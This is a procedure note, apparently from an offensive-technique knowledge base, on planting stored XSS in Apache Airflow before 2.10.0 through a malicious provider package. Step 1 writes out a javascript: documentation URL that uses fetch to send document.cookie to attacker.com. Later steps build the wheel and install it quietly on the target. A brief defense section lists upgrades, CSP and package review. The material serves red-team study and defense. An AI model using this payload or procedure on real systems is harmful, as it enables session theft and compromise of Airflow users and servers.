---
tags:
  - xss
  - stored-xss
  - apache-airflow
  - provider-installation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
  - Python
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 350f6918-d205-4da6-98e7-fb931d9043d8
created_at: '2025-12-13T23:52:55.734Z'
updated_at: '2025-12-13T23:52:55.734Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Develop-Malicious-Airflow-Provider-with-XSS-Payload

## Summary

This procedure outlines creating a custom Apache Airflow provider package with a stored XSS payload embedded in the documentation URL field, allowing injection of malicious JavaScript that executes when an authenticated user clicks the link in the web UI.

## Description

In Apache Airflow versions before 2.10.0, provider metadata, including the documentation URL, is not properly sanitized, enabling stored XSS. The attacker develops a Python package mimicking a legitimate provider, sets the 'documentation_url' to a javascript: URI containing the payload (e.g., for cookie theft), packages it, and installs it on the target server. Once loaded, the payload persists in the UI until the provider is removed. Prerequisites include Python knowledge for packaging and server access for installation. Expected outcomes: Payload storage and readiness for triggering via UI interaction.

## Requirements

1. Python 3.x environment with setuptools and wheel for packaging
2. Access to the Airflow server to install the package (e.g., via SSH or deployment pipeline)
3. Basic understanding of Airflow provider structure from official docs

## Defense

Defensive measures and detection strategies:

- Upgrade to Airflow 2.10.0 or later, which sanitizes provider metadata
- Restrict provider installation to trusted sources and review packages before deployment
- Enable Content Security Policy (CSP) in the web UI to block inline JavaScript execution
- Monitor for unusual provider installations and UI interactions via audit logs

## Objectives

1. Embed XSS payload in provider documentation URL for persistent storage
2. Install the provider on the Airflow instance without raising alarms
3. Prepare for JavaScript execution upon user interaction in the UI

## Instructions

### Step 1: Create Provider Package Structure

**Context**: Set up the basic files for an Airflow provider package, including metadata with the XSS payload.

Create a directory for the provider, e.g., `malicious_provider`, and add `__init__.py`. In `setup.py`, define the package with `documentation_url='javascript:fetch("https://attacker.com/steal?cookie="+document.cookie)'` in the provider info dictionary.

> This embeds the payload; customize the JS for specific exfiltration (e.g., to an attacker-controlled server).

### Step 2: Build the Package

**Context**: Compile the provider into an installable wheel file.

Run the build process using Python's build tools:

```bash
python -m build
```

> Expected output: A `.whl` file in the `dist/` directory, ready for installation.

### Step 3: Install on Target Server

**Context**: Deploy the malicious package to the Airflow environment.

Transfer the wheel file to the server and install via pip:

```bash
pip install dist/malicious_provider-0.1.0-py3-none-any.whl
```

> Restart Airflow webserver (`airflow webserver`) to load the provider. Verify in logs for successful registration.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[apache-airflow]]
